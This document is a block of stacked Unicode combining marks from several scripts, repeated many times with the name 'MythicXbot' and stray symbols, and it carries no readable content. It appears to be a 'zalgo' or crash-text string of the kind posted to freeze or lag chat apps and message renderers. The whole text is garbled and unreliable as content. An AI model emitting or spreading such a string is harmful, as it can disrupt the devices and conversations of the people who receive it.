͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅